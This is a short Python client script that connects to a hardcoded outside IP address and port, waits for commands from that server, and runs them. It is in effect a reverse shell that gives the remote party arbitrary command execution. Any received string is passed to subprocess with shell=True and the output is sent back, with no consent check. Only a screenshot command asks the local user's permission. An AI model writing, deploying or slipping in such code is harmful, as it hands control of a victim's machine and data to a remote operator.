import socket
import subprocess
import pyautogui

def start_client():
    host = '209.184.16.88'  # Server IP address
    port = 8080  # Port used by the server

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))
    print("Connected to {}:{}".format(host, port))

    while True:
        # Receive command from server
        command = client_socket.recv(1024).decode()

        if command.lower() == 'exit':
            break
        elif command.lower() == 'screenshot':
            # Ask for permission to share screen
            response = input("Allow server to see your screen? (Y/N): ")

            if response.lower() == 'y':
                # Take a screenshot and send to server
                screenshot = pyautogui.screenshot()
                screenshot.save("screenshot.png")
                client_socket.sendall("Screenshot taken.".encode())
            else:
                client_socket.sendall("Permission denied.".encode())
        else:
            # Execute the command
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
                client_socket.sendall(output.encode())
            except subprocess.CalledProcessError as e:
                client_socket.sendall(str(e.output).encode())

    # Close the connection
    client_socket.close()

if __name__ == '__main__':
    start_client()
